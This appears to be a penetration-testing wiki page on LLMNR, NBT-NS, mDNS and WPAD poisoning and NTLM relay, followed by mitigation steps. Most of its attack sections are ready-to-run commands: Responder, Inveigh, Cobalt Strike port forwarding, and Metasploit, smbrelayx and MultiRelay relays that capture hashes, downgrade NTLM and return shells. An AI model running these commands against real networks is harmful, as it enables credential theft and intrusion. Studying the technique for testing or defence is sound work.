## Network protocols

### LLMNR, NBT-NS, and mDNS

Microsoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network. These protocols are unauthenticated and broadcast messages over UDP; thus, attackers can exploit them to direct users to malicious services.

You can impersonate services that are searched by hosts using Responder to send fake responses.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### WPAD

Many browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network. A WPAD server provides client proxy settings via a particular URL (e.g., _http://wpad.example.org/wpad.dat_) upon being identified through any of the following:

* DHCP, using a code 252 entry[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, searching for the _wpad_ hostname in the local domain
* Microsoft LLMNR and NBT-NS (in the event of DNS lookup failure)

Responder automates the WPAD attack‚Äîrunning a proxy and directing clients to a malicious WPAD server via DHCP, DNS, LLMNR, and NBT-NS.

## Protocols Poisoning

### Responder - LLMNR, NBT-NS and MDNS

> Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to _specific_ NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: [http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)). By default, the tool will only answer to File Server Service request, which is for SMB.
>
> The concept behind this is to target our answers, and be stealthier on the network. This also helps to ensure that we don't break legitimate NBT-NS behavior.

* [**Responder**](https://github.com/lgandx/Responder) is installed in kali by default and the config file is located in \*\*`/etc/responder/Responder.conf` \*\* (here you can disable rogue servers)
* **Responder** will **print hashes out on screen** and **write** it to a **log** file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`
* You can find here Responder for **windows** [here](https://github.com/lgandx/Responder-Windows)
* Responder works in **ipv4** & **ipv6**

#### Responder Params

Responder supports the following options:

```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
                    BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
                    Network interface to use, you can use 'ALL' as a
                    wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
                    Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                    Poison all requests with another IPv6 address than
                    Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
                    Poison all requests with another IP address than
                    Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
                    Answering to wredir will likely break stuff on the
                    network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
                    option will inject a WPAD server in the DHCP response.
                    Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
                    response, otherwise a WPAD server will be added.
                    Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
                    False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                    Upstream HTTP proxy used by the rogue WPAD Proxy for
                    outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
                    retrieval. This may cause a login prompt. Default:
                    False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
                    authentication for the proxy. WPAD doesn't need to be
                    ON. This option is highly effective when combined with
                    -r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
                    earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```

<summary>Responder Params</summary>

* The `-A` flag puts us into **analyze mode**, allowing us to see NBT-NS, BROWSER, and LLMNR requests in the environment without poisoning any responses.
* We must always supply either an interface or an IP.
* `-wf` will start the WPAD rogue proxy server
* `-f` will attempt to fingerprint the remote host operating system and version
* Use the `-v` flag for increased verbosity (a lot of additional data printed to the console)
* Options such as `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly.
* The `-w` flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has [Auto-detect settings](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) enabled.

#### Running Responder

To run default Responder behaviour you only have to execute:

```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```

An interesting technique is to use responder to downgrade the NTLM authentication when possible. This will allow to **capture NTLMv1 challenges and responses** instead of NTLMv2 that can be **easily cracked** [**following this guide**](../../windows-hardening/ntlm/#ntlmv1-attack)**.**

```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```

By **default**, the **WPAD impersonation won't be executed**, but you can execute it doing:

```bash
responder -I <Iface> --wpad
```

You can also **resolve NetBIOS** requests with **your IP**. And create an **authentication proxy**:

```bash
responder.py -I <interface> -Pv
```

You won't be able to intercept NTLM hashes (normally), but you can easily grab some **NTLM challenges and responses** that you can **crack** using for example _**john**_ option `--format=netntlmv2`.

The **logs and the challenges** of default _**Responder**_ installation in kali can be found in `/usr/share/responder/logs`

#### Responder - DHCP Poisoning

Windows uses several custom DHCP options such as NetBIOS, WINS, WPAD settings. When a workstation sends a DHCP request to get its networking settings, these additional settings can be included in the DHCP answer to facilitate straightforward connectivity and name resolution.

Spoofing DHCP responses with no disruption can be challenging since you're interfering with a workstation network configuration. Usually, you need to have very good knowledge of the target subnet, where is the DNS server, where is the switch, routing table, domain, netmask, DHCP server, etc. **Any mistake with these settings will result in disruption on the network.**

However, spoofing DHCP answers has unique benefits. **It's definitely stealthier than ARP poisoning**; One unicast response is sufficient to permanently poison a victim's routing information, it's also common to see multiple DHCP servers operating on a network. Unicast DHCP answers are more complex to detect, a few switch provides security settings to prevent DHCP snooping, however those settings are not straightforward and are often misconfigured when enabled.

> This attack is highly effective and gives you assured NTLMv1/2 hashes.

```bash
./Responder.py -I eth0 -Pdv
```

#### Responder - Capturing credentials

Responder is going to **impersonate all the service using the mentioned protocols**. Once some user try to access a service being resolved using those protocols, **he will try to authenticate against Responde**r and Responder will be able to **capture** the "credentials" (most probably a **NTLMv2 Challenge/Response**):

It is possible to try to downgrade to NetNTLMv1 or to try to disable ESS.

### Inveigh - C#/PowerShell Responder

> Inveigh is a PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer and man-in-the-middle tool designed to assist penetration testers/red teamers that find themselves limited to a Windows system.

[**Inveigh** ](https://github.com/Kevin-Robertson/Inveigh)was a PowerShell script, now it's a C# binary that has the same main features as Responder. There is a [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) \*\*\*\* that lists all parameters and usage instructions.\
Another version can be found in [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero).

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

Or run it with more options:

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Or run the C# version:

```bash
Inveigh.exe
```

## NTML Relay Attack

This attack relays **SMB authentication sessions** on an internal network to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**. Please, note that the relayed authentication must be from a **user which has Local Admin access to the relayed** host and **SMB signing must be disabled**.

### 445 forward and tunneling

{% hint style="warning" %}
If you can **introduce a machine inside the network** you can use any of the **tools** of the following section to perform a relay attack and you don't need to care about this.
{% endhint %}

However, in red teams this isn't the case, in red teams you usually will need to **forward the traffic of the port 445 of a Windows machine to your machine** executing any of the following tools and then r**oute back the traffic of that tool through a proxy** to reach the machine to attack inside the internal.

The tool [**PortBender**](https://github.com/praetorian-inc/PortBender) \*\*\*\* is a driver to **redirect** traffic destined for port **445 to another port** (e.g. 8445) that **we can bind**. It **requires local admin** access in order for the driver to be loaded. It makes sense to use `cd C:\Windows\System32\drivers` since this is where most Windows drivers go.

```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```

### Metasploit

```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```

### smbrelayx

```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```

### MultiRelay

If you want to use **MultiRelay**, go to _**/usr/share/responder/tools**_ and execute MultiRelay (`-t <IP target> -u <User>`):

```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```

### Force NTLM Logins

In Windows you **may be able to force some privileged accounts to authenticate to arbitrary machines**. Read the following page to learn how:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Solution

### Disabling LLMNR

To disable LLMNR in your domain for DNS clients, open gpedit.msc.\
Navigate to Computer Configuration->Administrative Templates->Network->DNS client.\
Locate the option ‚ÄúTurn off multicast name resolution‚Äù and click ‚Äúpolicy setting‚Äù:

![](../../.gitbook/assets/1.jpg)

Once the new window opens, enable this option, press Apply and click OK:

![](../../.gitbook/assets/2.jpg)

### **Disabling NBT-NS**

One option for disabling NBT-NS is to use DHCP scope options.

If using Microsoft's DHCP server, select the scope that you want to disable NBT-NS for. Right click ‚ÄúScope Options‚Äù and click ‚ÄúConfigure Options‚Äù. In the example below, the DHCP scope in which I want to disable NBT-NS for is 192.168.1.100.

![](../../.gitbook/assets/3.jpg)

In the Scope Options window, navigate to the advanced tab, change the drop down window to ‚ÄúMicrosoft Windows 2000 Options‚Äù:

![](../../.gitbook/assets/4.jpg)

Select the option ‚Äú001 Microsoft Disable Netbios Option‚Äù from the list and change its value to ‚Äú0x2‚Äù, click Apply and then OK:

![](../../.gitbook/assets/5.jpg)

### WPAD

To mitigate against the WPAD attack, you can add an entry for "wpad" in your DNS zone. Note that the DNS entry does not need to point to a valid WPAD server. As long as the queries are resolved, the attack will be prevented.

### Multi-relay

1\. **Forcing SMB Signing on all local windows machines**. This setting will digitally sign each and every SMB session which forces both the client and server to verify the source of the packets before continuing. This setting is only enabled by default on Domain Controllers. The following articles from Microsoft detail these settings (which can be enabled through group policy), and how to implement them.

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **Reviewing and ensuring that the users on the local network can only remotely login to machines in which it is necessary**. For example: Sally can only log in to Sally‚Äôs workstation. If an attacker were to intercept Sally‚Äôs SMB Auth session, they could not relay the session to any workstations, rendering this method useless.

3\. **Restrict NTLM Authentication on the local network as much as possible**. This attack cannot take advantage of Kerberos authentication, so by limiting the amount of NTLM that‚Äôs occurring, this attack can be greatly hindered. There is information from Microsoft on making this happen, but be warned.. If Kerberos authentication fails for whatever reason, it generally falls back onto NTLM. If you disable it entirely, your network might grind to a halt.

4\. **Prevent unauthorised users on your network**. An insider threat will likely not be utilising an SMB Relay attack, as they already have network credentials. By beefing up your physical security policies, preventing rogue devices on the network with ACLs and MAC Filtering, and ensuring proper network segmentation, you can greatly limit the threat of this attack being performed.
